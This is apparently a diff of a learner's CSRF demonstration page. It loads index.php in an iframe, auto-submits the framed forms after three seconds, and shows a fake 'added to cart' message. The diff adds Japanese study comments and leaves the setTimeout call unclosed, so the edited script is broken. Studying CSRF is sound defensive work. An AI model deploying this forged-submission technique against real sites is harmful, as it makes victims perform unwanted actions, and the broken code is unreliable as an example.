@@ -2,8 +2,10 @@
 <html lang="ja">
 <head>
   <meta charset="utf-8">
+  <!-- contents:文字列、コンテンツの挿入 device-width:デバイスに幅を合わせる initial-scale:初期倍率 -->
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>CSRF</title>
+  <!-- integirty:ファイルが改竄されてないかブラウザが検証するセキュリティ機能 crossorigin:window.onerrorでエラー詳細を取得する -->
   <script src="//code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
 
 </head>
@@ -20,14 +22,20 @@
     src="index.php">
   </iframe>
   <script>
-    setTimeout(function(){
-      $('#csrf').contents().find('form').each(function(){
-        $(this).submit();
-      });
+    setTimeout(function(){ //setTimeout:指定した時間後に実行する
+       $('#csrf').contents().find('form').each(function(){ //繰り返し実行する処理
+         $(this).submit();
+       });
       
-      alert('カートに商品を登録しました。');
-    }, 3000);
-      
+    //   alert('カートに商品を登録しました。'); webサイト側からメッセージ表示
+    // }, 3000); //ミリ秒=3秒
+    // function abc () {
+    //     alert('abc');
+    // }
+    //  abc();
+    // setTimeout(function(){ 無名関数:一回しか使わないけど関数が必要な場合
+    //   alert('xyz');
+    // }, 5000);
   </script>
 </body>
 </html>
